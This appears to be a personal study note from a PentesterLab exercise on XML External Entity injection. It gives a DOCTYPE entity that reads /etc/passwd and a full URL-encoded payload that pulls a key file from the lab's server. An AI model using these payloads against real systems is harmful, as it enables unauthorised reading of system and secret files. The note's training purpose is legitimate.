---
tags: xml
---

Some parsers will resolve external files in xml, meaning we can inject local files like so:

```xml
<!ENTITY x SYSTEM "file:///etc/passwd">
```

You will need to envelope this properly:
```xml
<!DOCTYPE test [
	<!ENTITY x SYSTEM "file:///etc/passwd">]>
```

Then simply use a reference to __x__: `&x` to get the results back.

```ad-important
__encoding__ is very important, especially for the `&` (`%26`)
```

A final payload might look like:

```url
http://ptl-354c74b7-421a19bf.libcurl.so/?xml=%3C!DOCTYPE%20test%20[%3C!ENTITY%20x%20SYSTEM%20%22file:///pentesterlab.key%22%3E]%3E%3Ctest%3E%26x;%3C/test%3E
```

